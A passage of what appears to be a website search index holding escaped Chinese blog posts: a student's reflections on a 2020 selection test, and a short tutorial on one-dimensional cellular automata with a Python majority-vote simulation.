05a\u9898\u65f6\u7684\u5177\u4f53\u611f\u53d7\u3002 \u5bf9\u4e8e\u9898\u76ee\u5177\u4f53\u5206\u6790\u548c\u76f8\u5173\u77e5\u8bc6\uff0c\u6211\u60f3\u6211\u5927\u6982\u4e5f\u8bb8\u53ef\u80fd\u4f1a\u5199\u4e00\u4e2a\u7cfb\u5217\u8be6\u7ec6\u4ecb\u7ecd\u5427\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e3b\u8981\u8bf4\u8bf4\u611f\u53d7\uff0c\u77e5\u8bc6\u6027\u53ef\u80fd\u4e0d\u4e00\u5b9a\u5f88\u5f3a\u3002","title":"\u8d77\u6e90"},{"location":"legacy/old_blog/20200318/#_3","text":"\u6d4f\u89c8\u4e86\u4e00\u904d\u62a5\u540d\u8868\u540e\uff0c\u6211\u5927\u6982\u5c06\u62a5\u540d\u8868\u5206\u6210\u4ee5\u4e0b\u51e0\u4e2a\u90e8\u5206\u3002 \u9898\u76ee\u5217\u8868 Module 1 Task 1\uff1aStory Board Task 2\uff1aAffective Diary Module 2 Section 1\uff1aMatlab Tilted Photos Image Processing Section 2 SolidWorks Multisim Python Assembly Section 3 Math in Epidemic Lagrangian Function in Physics Chemistry and Engineering \u5177\u4f53\u7684\u8981\u6c42\u662f\u5728Module 1\u4e2d\u9009\u62e9\u4e00\u4e2aTask\u5b8c\u6210\uff0c\u540c\u65f6\u8981\u6c42\u5b8c\u6210Module 2\u4e2d\u6bcf\u4e2aSection\u4e2d\u7684\u4e00\u9053\u9898\uff0c\u6240\u4ee5\u603b\u5171\u9700\u8981\u5b8c\u6210\u56db\u9053\u9898\uff0c\u63a5\u4e0b\u6765\u6211\u5c06\u4ee5\u6211\u7684\u7b54\u9898\u987a\u5e8f\u6765\u8bb2\u8bb2\u6211\u505a\u9898\u4e2d\u7684\u611f\u53d7\u548c\u60f3\u6cd5\u3002","title":"\u521d\u5165\u70bc\u72f1"},{"location":"legacy/old_blog/20200318/#_4","text":"","title":"\u7f13\u6162\u524d\u8fdb"},{"location":"legacy/old_blog/20200318/#python","text":"\u6211\u4e4b\u6240\u4ee5\u9009\u62e9Python\u5165\u624b\uff0c\u539f\u56e0\u662f\u5728\u90a3\u4e48\u591a\u9898\u4e2d\u6211\u76f8\u5bf9\u6bd4\u8f83\u719f\u6089\u3002\u800c\u4e14\u4ece\u8fd9\u6b21\u9898\u76ee\u4e2d\u6765\u770b\uff0c\u8fd9\u662f\u4e00\u9053\u76f8\u5bf9\u6bd4\u8f83\u7b80\u5355\u7684\u9898\uff0c\u53ea\u8981\u6c42\u4f60\u901a\u8fc7Pygame\u6765\u5b9e\u73b0\u4e00\u4e2a\u5b83\u6240\u8981\u6c42\u7684\u5c0f\u6e38\u620f\u5373\u53ef\u3002\u5c31\u6211\u4e2a\u4eba\u611f\u53d7\u800c\u8a00\uff0c\u6574\u4f53\u96be\u5ea6\u4e0d\u5927\uff0c\u7b97\u6cd5\u8981\u6c42\u4e0d\u9ad8\uff0c\u4e00\u822c\u6765\u8bf4\u51e0\u4e2a\u5c0f\u65f6\u5c31\u80fd\u5b8c\u6210\uff0c\u6240\u4ee5\u6211\u4e5f\u4e0d\u518d\u8d58\u8ff0\uff0c\u7b49\u4ee5\u540e\u7cfb\u5217\u535a\u6587\u91cc\u518d\u63d0\u5427\u3002\u53e6\u5916\uff0c\u628a\u5b83\u653e\u5728\u6700\u5148\u505a\uff0c\u8fd8\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u63a8\u52a8\u6211\u53bb\u505a\u8868\uff0c\u4e00\u662f\u56e0\u4e3a\u589e\u5f3a\u4e86\u4fe1\u5fc3\uff0c\u4e8c\u662f\u6709\u4e86\u96be\u4ee5\u653e\u5f03\u7684\u6c89\u6ca1\u6210\u672c\uff0c\u563f\u563f\u3002","title":"Python"},{"location":"legacy/old_blog/20200318/#matlabtilted-photos","text":"\u8fd9\u9053\u9898\uff0c\u771f\u7684\u662f\u628a\u6211\u521a\u521a\u4ecePython\u5efa\u7acb\u8d77\u7684\u4fe1\u5fc3\u5f7b\u5f7b\u5e95\u5e95\u7684\u6253\u57ae\u4e86\u3002\u867d\u7136\u8bf4\u4e0a\u5b66\u671f\u6211\u65e9\u5c31\u628aMatlab\u5b89\u88c5\u4e86\uff0c\u4f46\u9876\u591a\u7528\u6765\u89e3\u89e3\u6570\u5b66\u9898\u4e4b\u7c7b\uff0c\u81f3\u4e8e\u5176\u4ed6\uff0c\u751a\u81f3\u5b83\u672c\u8eab\u7684\u8bed\u6cd5\u90fd\u4e0d\u592a\u4e86\u89e3\uff0c\u4f46\u4e5f\u53ea\u80fd\u786c\u7740\u5934\u76ae\u4e0a\u3002\u66f4\u52a0\u8ba9\u4eba\u5954\u6e83\u7684\u662f\uff0c\u5b83\u8981\u6c42\u4e0d\u80fd\u4f7f\u7528Matlab\u672c\u8eab\u63d0\u4f9b\u7684\u51fd\u6570\u6216\u8005Toolbox\u6765\u89e3\u51b3\u5173\u952e\u6b65\u9aa4\uff0c\u6362\u4e00\u53e5\u8bdd\u8bf4\uff0c\u5c31\u662f\u5173\u952e\u7b97\u6cd5\u8981\u81ea\u5df1\u53bb\u60f3\u3002\u6700\u540e\uff0c\u6211\u82b1\u4e86\u8fd1\u4e24\u5929\u65f6\u95f4\u5b66\u4e60\u4e86Matlab\u4ee5\u53ca\u6709\u5173\u56fe\u50cf\u5904\u7406\u8bc6\u522b\u7684\u4e00\u90e8\u5206\u77e5\u8bc6\uff0c\u624d\u52c9\u52c9\u5f3a\u5f3a\u5730\u5b8c\u6210\u4e86\u5b83\u4e00\u90e8\u5206\u7684\u8981\u6c42\u3002 \u6700\u540e\u5173\u4e8e\u795e\u7ecf\u7f51\u7edc\u90e8\u5206\uff0c\u7531\u4e8e\u65f6\u95f4\u539f\u56e0\uff0c\u6211\u662f\u6ca1\u6709\u5b8c\u6210\u7684\uff0c\u4e0d\u8fc7\u540e\u7eed\u6211\u4f1a\u8ddf\u8fdb\u5b66\u4e60\uff0c\u5e94\u8be5\u4f1a\u53d1\u5b66\u4e60\u535a\u6587\u7684\u5427\u3002\u603b\u4f53\u6765\u8bf4\uff0c\u6211\u5bf9\u81ea\u5df1\u8fd8\u662f\u6bd4\u8f83\u6ee1\u610f\u7684\uff0c\u6bd5\u7adf\u6211\u4e0d\u662f\u5927\u4f6c\uff0c\u53ea\u662f\u4e00\u4e2a\u5c0f\u83dc\u9e21\uff0c\u54b8\u9c7c\u53ef\u662f\u5f88\u5bb9\u6613\u81ea\u6211\u6ee1\u8db3\u7684~\uff0845\u5ea6\u4ef0\u671b\u5927\u4f6corz","title":"Matlab\uff1aTilted Photos"},{"location":"legacy/old_blog/20200318/#lagrangian-function-in-physics","text":"\u4ece\u5185\u5bb9\u4e0a\u6765\u770b\u5e94\u8be5\u662f\u4e00\u9053\u7406\u8bba\u7269\u7406\u9898\uff0c\u6beb\u65e0\u57fa\u7840\u7684\u6211\u5bf9\u7740\u76f8\u5173\u77e5\u8bc6\u8fdb\u884c\u4e00\u6ce2\u56eb\u56f5\u541e\u67a3\uff0c\u52c9\u5f3a\u4f5c\u51fa\u4e86\u4e00\u90e8\u9898\u76ee\uff0c\u4e0d\u8fc7\u540e\u9762\u9047\u5230\u4e86\u65e0\u6cd5\u63a5\u7684\u591a\u5143\u5fae\u5206\u65b9\u7a0b\u7ec4\u7684\u95ee\u9898\uff0c\u4e8e\u662f\u5c31\u96be\u4ee5\u8fdb\u884c\u4e0b\u53bb\u3002\u6211\u4e2a\u4eba\u5176\u5b9e\u5bf9\u8fd9\u9053\u9898\u633a\u9057\u61be\u7684\uff0c\u6bd5\u7adf\u611f\u89c9\u5c31\u5dee\u4e00\u70b9\u70b9\uff0c\u7b97\u4e86\uff0c\u90fd\u8fc7\u53bb\u4e86\u3002\u672c\u6765\u5c31\u662f\u4e34\u65f6\u5b66\u7684\uff0c\u57fa\u7840\u5565\u4e5f\u6ca1\u6709\uff0c\u5c31\u8fd9\u6837\u5427\u3002","title":"Lagrangian Function in Physics"},{"location":"legacy/old_blog/20200318/#affective-diary","text":"\u8fd9\u4e00\u90e8\u5206\u5c31\u6bd4\u8f83\u7b80\u7b54\u4e86\uff0c\u7531\u4e8e\u8003\u5bdf\u7684\u662f\u827a\u672f\u5ba1\u7f8e\u548c\u4eba\u6587\u7d20\u517b\uff0c\u6240\u4ee5\u5927\u6982\u5c31\u662f\u5f88\u7384\u5b66\u5427\u3002\u5148\u8981\u6c42\u53bb\u8bfb\u4e00\u7bc7\u82f1\u6587\u8bba\u6587\uff08\u597d\u50cf\u662f\u5fae\u8f6f\u7814\u7a76\u9662\u7684\uff0c\u4e0d\u8fc7\u4e2a\u4eba\u611f\u89c9\u6ca1\u5565\u5e2e\u52a9\u3002\u4e4b\u540e\u4fbf\u662f\u8981\u6c42\u5236\u4f5c\u4e00\u4efd\u5c5e\u4e8e\u81ea\u5df1\u7684Affective Diary\uff0c\u624b\u7ed8\u3001\u7535\u8111\u5236\u56fe\u90fd\u884c\u3002\u6211\u9009\u62e9\u4e86\u7528Ps\uff0c\u6700\u6df1\u7684\u611f\u53d7\u5c31\u662f\uff0c\u6211\u5bf9\u7f8e\u672f\u5b8c\u4e86\uff01\uff01\uff01\u505a\u5230\u8fd9\u91cc\u6211\u5df2\u7ecf\u4f5b\u7cfb\u4e86\uff0c\u4e00\u5207\u968f\u7f18\u7684\u6211\u5df2\u7ecf\u628a\u505a\u5b8c\u8868\u5f53\u4f5c\u76ee\u6807\u4e86\u3002\u8d28\u91cf\u4ec0\u4e48\u7684\u90fd\u4e00\u8fb9\u53bb\uff01","title":"Affective Diary"},{"location":"legacy/old_blog/20200318/#_5","text":"\u867d\u7136\u8bf4\u622a\u6b62\u65f6\u95f4\u662f\u4eca\u5929\u65e9\u4e0a11:00\uff0c\u4e0d\u8fc7\u6211\u8fd8\u662f\u5728\u6628\u5929\u665a\u4e0a\u5c31\u7126\u8651\uff0c\u6bd5\u7adf\u65e9\u4ea4\u65e9\u8d85\u751f\uff0c\u5b9e\u9645\u4e0a\u662f\u56e0\u4e3a\u6211\u505a\u4e0d\u51fa\u6765\u4e86\u3002\u540e\u9762\u8fd8\u6709\u4e09\u8f6e\u7684\u8003\u6838\uff0c\u5982\u679c\u6211\u80fd\u82df\u8fdb\u540e\u9762\u51e0\u8f6e\u8003\u6838\uff0c\u6211\u4e5f\u4f1a\u5199\u76f8\u5173\u5185\u5bb9\u7684\uff08\u5c3d\u91cf\u3002 \u4e0d\u8fc7\u6709\u4e00\u8bf4\u4e00\uff0c\u6211\u8fd8\u662f\u5e0c\u671b\u7b2c\u4e00\u8f6e \u88ab\u5237\u4e5f\u4e0d\u8981\u6700\u540e\u4e00\u8f6e\u88ab\u5237\u3002 \u8fd8\u6709\uff0c\u6211\u53d1\u73b0\u8fd9\u6b21\u53ef\u80fd\u7531\u4e8e\u75ab\u60c5\u5728\u5bb6\u7684\u539f\u56e0\uff0c\u7adf\u7136\u53ea\u670987\u4eba\u53c2\u4e0e\u4e86\u62a5\u540d\uff0c\u5f55\u53d6\u7387\u9ad8\u8fbe46%\uff01\u4f46\u662f\u6211\u77e5\u9053\uff0c\u8fd9\u8fd8\u662f\u5927\u4f6c\u7684\u6218\u4e89\uff0c\u5927\u4f6c\u7684\u5e73\u5747\u6c34\u5e73\u2026\u2026. \u5bb3\uff0c\u4e0d\u8bf4\u4e86\uff0c\u6211\u8981\u597d\u597d\u4f11\u606f\u8c03\u6574\u4e00\u4e0b\u4e86zzzzzzzzzz","title":"\u540e\u8bb0"},{"location":"legacy/old_blog/20200328/","text":"\u5143\u80de\u81ea\u52a8\u673a \u00b6 \u7ea6 1033 \u4e2a\u5b57 54 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f \u5199\u5728\u524d\u9762 \u521a\u521a\u7ed3\u675f\u4e86\u5de5\u9ad8\u7684\u7b2c\u4e8c\u8f6e\u9762\u8bd5\u2014\u2014\u5b9e\u8df5\u9762\u8bd5\uff0c\u6574\u4e00\u4e2a\u9762\u8bd5\u662f\u8981\u6c42\u4e00\u4e2a\u56e2\u961f\u4e00\u8d77\u5408\u4f5c\u5728\u4e09\u5929\u5185\u5b8c\u6210\u51e0\u9053\u6570\u5b66\u5efa\u6a21\u9898\uff0c\u8fc7\u7a0b\u7279\u809d\uff0c\u6211\u771f\u7684\u53ef\u80fd\u628a\u6bcf\u9053\u9898\u7684\u5206\u6790\u90fd\u7801\u4e0a\u6765\u4e86\u3002\u6240\u4ee5\u6211\u5c31\u7b80\u8981\u7684\u63d0\u4e00\u4e0b\u5176\u4e2d\u63a5\u89e6\u5230\u7684\u77e5\u8bc6\u5427\u3002\u4eca\u5929\uff0c\u6211\u5c31\u6765\u7b80\u8981\u8bf4\u8bf4 \u5143\u80de\u81ea\u52a8\u673a \u7684\u4e00\u4e9b\u77e5\u8bc6\u5427\u3002 \u672c\u6587\u5199\u4e8e2020\u5e743\u670828\u65e5\uff0c\u73b0\u6574\u7406\u6536\u5f55\u3002 \u5143\u80de\u81ea\u52a8\u673a\uff08CA\uff09 \u5b83\u662f\u4e00\u79cd\u65f6\u95f4\u3001\u7a7a\u95f4\u3001\u72b6\u6001\u90fd\u79bb\u6563\u7684\uff0c\u7a7a\u95f4\u76f8\u4e92\u4f5c\u7528\u548c\u56e0\u679c\u5173\u7cfb\u4e3a\u5c40\u90e8\u7684\u7f51\u683c\u52a8\u529b\u5b66\u6a21\u578b\u3002\u5176\u4e2d\u91cd\u8981\u7684\u90e8\u5206\u662f\u89c4\u5219\u548c\u90bb\u5c45\uff0c\u8fd9\u4e24\u4e2a\u8981\u7d20\u51b3\u5b9a\u4e86\u5143\u80de\u81ea\u52a8\u673a\u7684\u6f14\u5316\u8fc7\u7a0b\u3002\u5176\u6700\u51fa\u540d\u7684\u4fbf\u662f\u975e\u5e38\u6d41\u884c\u7684\u201c\u751f\u547d\u6e38\u620f\u201d\u3002 \u4e00\u7ef4\u5143\u80de\u81ea\u52a8\u673a \u00b6 \u4e3a\u4e86\u7b80\u5316\uff0c\u6240\u4ee5\u4ece\u7b80\u5355\u7684\u4e00\u7ef4\u5143\u80de\u81ea\u52a8\u673a\u8bf4\u8d77\u3002 \u5176\u662f\u7531\u4e00\u884c\u5143\u80de\u6784\u6210\uff0c\u6bcf\u4e2a\u5143\u80de\u7684\u72b6\u6001\u67091\u62160\u4e24\u4e2a\u72b6\u6001 \uff0c\u8fd9\u6574\u4e00\u884c\u5143\u80de\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u5143\u80de\u81ea\u52a8\u673a\u3002\u5176\u4e0b\u4e00\u4ee3\u7684\u6f14\u5316\u65b9\u5f0f\u662f\u7531\u6bcf\u4e2a\u5143\u80de\u76f8\u90bb\u7684N\u4e2a\u5143\u80de\u72b6\u6001\u548c\u81ea\u8eab\u7684\u72b6\u6001\u5f62\u6210\u7684N+1\u90bb\u57df\u5171\u540c\u51b3\u5b9a\u3002 \u5f53N=2\u65f6\uff0c\u5373\u6bcf\u4e2a\u5143\u80de\u548c\u5176\u76f8\u90bb\u7684\u5de6\u53f3\u4e24\u4e2a\u5143\u80de\u7684\u72b6\u6001\u51b3\u5b9a\u4e0b\u4e00\u4ee3\u7684\u72b6\u6001\uff0c\u5177\u4f53\u5982\u4f55\u751f\u6210\u5462\uff0c\u8fd9\u91cc\u5148\u7528\u4e00\u79cd\u7b80\u5355\u7684\u89c4\u5219\u52a0\u4ee5\u5c55\u793a\u3002 \u5f88\u5bb9\u6613\u5f97\u5230\uff0c3\u90bb\u57df\u7684\u5143\u80de\u72b6\u6001\u603b\u5171\u67092^3=8\u79cd\u72b6\u6001\uff0c\u5982\u4e0b\uff1a 000 001 010 011 100 101 110 111 \u5176\u6bcf\u4e00\u4e2a\u72b6\u6001\u90fd\u51b3\u5b9a\u4e0b\u4e00\u4ee3\u72b6\u6001\uff0c\u5982 0 0 0 0 1 1 1 1 \u90a3\u4e48\u89c4\u5219\u5c31\u53ef\u4ee5\u4ee5 00001111 \u6765\u8868\u793a\uff0c\u79f0\u5176\u4e3a\u89c4\u5219\u6570\u3002 \u4ee5\u4e0a\u5c31\u662f\u4e00\u79cd\u4ea7\u751f\u89c4\u5219\uff0c\u4f46\u662f\u6211\u4eec\u5f88\u5feb\u4f1a\u53d1\u73b0\u8fd9\u6837\u4f1a\u9047\u5230\u4e00\u4e2a\u95ee\u9898\uff0c\u5728\u4e24\u7aef\u7684\u4f1a\u51fa\u73b0\u76f8\u90bb\u5143\u80de\u6570\u4e0d\u8db3\u7684\u73b0\u8c61\u3002\u6b64\u65f6\u4e00\u822c\u4f1a\u91c7\u7528\u9996\u5c3e\u76f8\u8fde\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\u3002 \u6295\u7968\u673a \u00b6 \u4e3a\u4e86\u66f4\u597d\u7684\u7406\u89e3\u5143\u80de\u81ea\u52a8\u673a\uff0c\u8fd9\u91cc\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u6848\u4f8b\u6765\u5c55\u793a\u3002 \u4e00\u4e2a\u6709 n \u4e2a\u5143\u80de\u7684\u4e00\u7ef4\u5143\u80de\u81ea\u52a8\u673a\uff0c\u80fd\u8f83\u597d\u5b9e\u73b0\u201c\u5c11\u6570\u670d\u4ece\u591a\u6570\u201d\u7684\u4efb\u52a1\uff1a\u82e5\u8f93\u5165\uff08t0 = 0\uff09\u4e2d \u72b6\u6001\u4e3a 1 \u7684\u5143\u80de\u591a\u4e8e\u72b6\u6001\u4e3a 0 \u7684\u5143\u80de\uff0c\u5219\u7ecf\u8fc7 t \u6b21\u8fd0\u7b97\u540e\u6240\u6709\u5143\u80de\u72b6\u6001\u4e3a 1\uff1b\u540c\u7406\uff0c\u82e5\u8f93\u5165\uff08t0 = 0\uff09 \u4e2d\u72b6\u6001\u4e3a 0 \u7684\u5143\u80de\u591a\u4e8e\u72b6\u6001\u4e3a 1 \u7684\u5143\u80de\uff0c\u5219\u7ecf\u8fc7 t \u6b21\u8fd0\u7b97\u540e\u6240\u6709\u5143\u80de\u72b6\u6001\u4e3a 0\u3002\u8bf7\u5236\u5b9a\u89c4\u5219\uff0c\u4f7f\u5f97\u9002\u5e94\u5ea6\u5c3d\u53ef\u80fd\u7684\u9ad8\u3002 \u6839\u636e\u4e0a\u9762\u7684\u89e3\u91ca\uff0c\u5927\u5bb6\u53ef\u4ee5\u81ea\u884c\u5c1d\u8bd5\u3002 \u8fd9\u91cc\u6211\u7ed9\u51fa\u6700\u4f18\u89e3\u6cd5\uff1a \u9009\u53d67\u90bb\u57df\u4f5c\u4e3a\u51b3\u5b9a\u4e0b\u4e00\u4ee3\u7684\u72b6\u6001\u7ec4\uff0c\u8fd9\u6837\u89c4\u5219\u6570\u5c31\u67092^7=128\u4f4d \u89c4\u5219\u6570\uff1a 00000101000001100001010110000111000001110000010000010101010101110110010001110111 000001010000000101111101111111111011011101111111 \u63a5\u4e0b\u6765\u65e2\u53ef\u4ee5\u91c7\u53d6\u9996\u5c3e\u76f8\u8fde\u7684\u65b9\u5f0f\u4e5f\u53ef\u4ee5\uff0c\u7a0d\u5fae\u4e0e\u5143\u80de\u81ea\u52a8\u673a\u5b9a\u4e49\u6709\u6240\u5dee\u522b\u7684\u6574\u4f53\u4f18\u52bf\u8865\u5168\u6cd5\uff0c\u5373\u7528\u4e0a\u4e00\u4ee3\u72b6\u6001\u4e2d\u5360\u4f18\u52bf\u7684\u72b6\u6001\u6765\u8865\u9f50\u9996\u5c3e\u3002 \u4e4b\u6240\u4ee5\u6709\u6240\u4e0d\u59a5\uff0c\u662f\u56e0\u4e3a\u8fd9\u91cc\u6709\u70b9\u7c7b\u4f3c[^\u51af\u8bfa\u4f9d\u66fc\u673a]\u7684\u4e00\u6b65\u5230\u4f4d\u7684\u60f3\u6cd5\uff0c\u4f46\u662f\u91c7\u53d6\u8fd9\u6837\u7684\u65b9\u6cd5\u53ef\u4ee5\u4f7f\u9002\u5e94\u5ea6\u8fbe\u5230100%\uff0c\u6240\u4ee5\u8fd9\u91cc\u5c31\u91c7\u7528\u4e86\u6574\u4f53\u4f18\u52bf\u8865\u5168\u7684\u65b9\u6cd5\u3002 Python\u5b9e\u73b0\u4ee3\u7801 from random import randint def getBirth ( N ): f =- 1 while f ==- 1 : #\u907f\u514d\u4ea7\u751f1\u548c0\u6570\u76ee\u76f8\u540c\u7684\u521d\u59cb\u72b6\u6001 s = '' for i in range ( N ): s += str ( randint ( 0 , 1 )) if s . count ( '0' ) > s . count ( '1' ): f = 0 elif s . count ( '0' ) == s . count ( '1' ): f =- 1 else : f = 1 return s , f def getNext ( n , f ): rule = '0000010100000110000101011000 \\ 011100000111000001000001010101 \\ 010111011001000111011100000101 \\ 0000000101111101111111111011011101111111' nextGeneration = '' N = len ( n ) for i in range ( N ): #\u8fb9\u7f18\u5355\u72ec\u8003\u8651\u8865\u5168 if i < 3 : s = str ( f ) * ( 3 - i ) + n [ 0 : i ] + n [ i : i + 4 ] elif i > N - 4 : s = n [ i - 3 : i ] + n [ i : N ] + str ( f ) * ( 3 - ( N - 1 - i )) else : s = n [ i - 3 : i ] + n [ i : i + 4 ] s = int ( s , 2 ) nextGeneration += rule [ s ] return nextGeneration def main (): num = 0 ; #\u8bb0\u5f55\u6210\u529f\u6b21\u6570 datas = 200 #\u6d4b\u8bd5\u6570\u636e\u603b\u6570 for i in range ( datas ): N = 100 #\u5e8f\u5217\u957f\u5ea6 t = 0 #\u8bb0\u5f55\u65f6\u95f4 n , f = getBirth ( N ) #\u751f\u6210\u521d\u59cb\u72b6\u6001 while t < 300 : #\u8d85\u8fc7300\u6b21\uff0c\u9ed8\u8ba4\u5224\u5b9a\u65e0\u6cd5\u6210\u529f n = getNext ( n , f ) t += 1 if ( f == 0 and n . count ( '0' ) == N ) or ( f == 1 and n . count ( '1' ) == N ): #\u5224\u65ad\u662f\u5426\u6210\u529f num += 1 break # \u8f93\u51fa\u7ed3\u679c print ( 'datas sum:' , datas ) print ( int ( num / datas * 100 ), '%' ) if __name__ == '__main__' : main () input () \u968f\u4fbf\u8bf4\u8bf4 \u00b6 \u8fd9\u91cc\u6211\u5c31\u6682\u65f6\u8bf4\u5230\u8fd9\u91cc\u4e86 \u4e3b\u8981\u592a\u61d2\u4e86\uff0c\u4e0d\u60f3\u7801\u5b57\u4e86 \uff0c\u81f3\u4e8e\u89c4\u5219\u662f\u5982\u4f55\u4ea7\u751f\u7684\uff0c\u5404\u4f4d\u53ef\u4ee5\u53bb\u53c2\u8003 \u9057\u4f20\u7b97\u6cd5 \uff0c\u6211\u5728\u8fd9\u91cc\u4e5f\u63a8\u8350\u4e00\u672c\u4e66\uff0c\u8bb2\u7684\u633a\u7b80\u5355\u7684\u3002 \u300a\u590d\u6742\u300b \u6885\u62c9\u59ae\u00b7\u7c73\u6b47\u5c14 \u300aComplexity: A Guided Tour\u300b Melanie Mitchell \u8fd9\u4e0a\u9762\u662f\u4e00\u672c\u4e66\u54e6\uff0c\u53ea\u662f\u4e2d\u82f1\u6587\u7684\u533a\u522b~ \u5199\u5728\u6700\u540e \u00b6 \u5176\u5b9e\u5143\u80de\u81ea\u52a8\u673a\u672c\u8eab\u5e76\u4e0d\u590d\u6742\uff0c\u4f46\u662f\u53ef\u4ee5\u6a21\u62df\u5f88\u591a\u590d\u6742\u7684\u73b0\u8c61\uff0c\u5728\u8fd9\u6b21\u5b9e\u8df5\u9762\u8bd5\u4e2d\u8fd8\u5b9e\u73b0\u4e86\u957f\u4e09\u89d2\u57ce\u5e02\u5efa\u6210\u533a\u7684\u6a21\u62df\u3001\u8fd8\u6709\u6559\u5ba4\u9003\u751f\u7684\u6a21\u62df\u7b49\u7b49\uff0c\u6709\u5174\u8da3\u7684\u8bdd\uff0c\u53ef\u4ee5\u6df1\u5165\u4e86\u89e3\u3002 \u8fd9\u6b21\u8bb2\u7684\u5f88\u6d45\uff0c\u7b49\u6211\u6709\u5174\u8da3\u7801\u5b57\u4e86\uff0c\u518d\u8be6\u7ec6\u5c55\u5f00\u8bb2\u8bb2\uff08\u9003","title":"\u5143\u80de\u81ea\u52a8\u673a"},{"location":"legacy/old_blog/20200328/#_1","text":"\u7ea6 1033 \u4e2a\u5b57 54 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f \u5199\u5728\u524d\u9762 \u521a\u521a\u7ed3\u675f\u4e86\u5de5\u9ad8\u7684\u7b2c\u4e8c\u8f6e\u9762\u8bd5\u2014\u2014\u5b9e\u8df5\u9762\u8bd5\uff0c\u6574\u4e00\u4e2a\u9762\u8bd5\u662f\u8981\u6c42\u4e00\u4e2a\u56e2\u961f\u4e00\u8d77\u5408\u4f5c\u5728\u4e09\u5929\u5185\u5b8c\u6210\u51e0\u9053\u6570\u5b66\u5efa\u6a21\u9898\uff0c\u8fc7\u7a0b\u7279\u809d\uff0c\u6211\u771f\u7684\u53ef\u80fd\u628a\u6bcf\u9053\u9898\u7684\u5206\u6790\u90fd\u7801\u4e0a\u6765\u4e86\u3002\u6240\u4ee5\u6211\u5c31\u7b80\u8981\u7684\u63d0\u4e00\u4e0b\u5176\u4e2d\u63a5\u89e6\u5230\u7684\u77e5\u8bc6\u5427\u3002\u4eca\u5929\uff0c\u6211\u5c31\u6765\u7b80\u8981\u8bf4\u8bf4 \u5143\u80de\u81ea\u52a8\u673a \u7684\u4e00\u4e9b\u77e5\u8bc6\u5427\u3002 \u672c\u6587\u5199\u4e8e2020\u5e743\u670828\u65e5\uff0c\u73b0\u6574\u7406\u6536\u5f55\u3002 \u5143\u80de\u81ea\u52a8\u673a\uff08CA\uff09 \u5b83\u662f\u4e00\u79cd\u65f6\u95f4\u3001\u7a7a\u95f4\u3001\u72b6\u6001\u90fd\u79bb\u6563\u7684\uff0c\u7a7a\u95f4\u76f8\u4e92\u4f5c\u7528\u548c\u56e0\u679c\u5173\u7cfb\u4e3a\u5c40\u90e8\u7684\u7f51\u683c\u52a8\u529b\u5b66\u6a21\u578b\u3002\u5176\u4e2d\u91cd\u8981\u7684\u90e8\u5206\u662f\u89c4\u5219\u548c\u90bb\u5c45\uff0c\u8fd9\u4e24\u4e2a\u8981\u7d20\u51b3\u5b9a\u4e86\u5143\u80de\u81ea\u52a8\u673a\u7684\u6f14\u5316\u8fc7\u7a0b\u3002\u5176\u6700\u51fa\u540d\u7684\u4fbf\u662f\u975e\u5e38\u6d41\u884c\u7684\u201c\u751f\u547d\u6e38\u620f\u201d\u3002","title":"\u5143\u80de\u81ea\u52a8\u673a"},{"location":"legacy/old_blog/20200328/#_2","text":"\u4e3a\u4e86\u7b80\u5316\uff0c\u6240\u4ee5\u4ece\u7b80\u5355\u7684\u4e00\u7ef4\u5143\u80de\u81ea\u52a8\u673a\u8bf4\u8d77\u3002 \u5176\u662f\u7531\u4e00\u884c\u5143\u80de\u6784\u6210\uff0c\u6bcf\u4e2a\u5143\u80de\u7684\u72b6\u6001\u67091\u62160\u4e24\u4e2a\u72b6\u6001 \uff0c\u8fd9\u6574\u4e00\u884c\u5143\u80de\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u5143\u80de\u81ea\u52a8\u673a\u3002\u5176\u4e0b\u4e00\u4ee3\u7684\u6f14\u5316\u65b9\u5f0f\u662f\u7531\u6bcf\u4e2a\u5143\u80de\u76f8\u90bb\u7684N\u4e2a\u5143\u80de\u72b6\u6001\u548c\u81ea\u8eab\u7684\u72b6\u6001\u5f62\u6210\u7684N+1\u90bb\u57df\u5171\u540c\u51b3\u5b9a\u3002 \u5f53N=2\u65f6\uff0c\u5373\u6bcf\u4e2a\u5143\u80de\u548c\u5176\u76f8\u90bb\u7684\u5de6\u53f3\u4e24\u4e2a\u5143\u80de\u7684\u72b6\u6001\u51b3\u5b9a\u4e0b\u4e00\u4ee3\u7684\u72b6\u6001\uff0c\u5177\u4f53\u5982\u4f55\u751f\u6210\u5462\uff0c\u8fd9\u91cc\u5148\u7528\u4e00\u79cd\u7b80\u5355\u7684\u89c4\u5219\u52a0\u4ee5\u5c55\u793a\u3002 \u5f88\u5bb9\u6613\u5f97\u5230\uff0c3\u90bb\u57df\u7684\u5143\u80de\u72b6\u6001\u603b\u5171\u67092^3=8\u79cd\u72b6\u6001\uff0c\u5982\u4e0b\uff1a 000 001 010 011 100 101 110 111 \u5176\u6bcf\u4e00\u4e2a\u72b6\u6001\u90fd\u51b3\u5b9a\u4e0b\u4e00\u4ee3\u72b6\u6001\uff0c\u5982 0 0 0 0 1 1 1 1 \u90a3\u4e48\u89c4\u5219\u5c31\u53ef\u4ee5\u4ee5 00001111 \u6765\u8868\u793a\uff0c\u79f0\u5176\u4e3a\u89c4\u5219\u6570\u3002 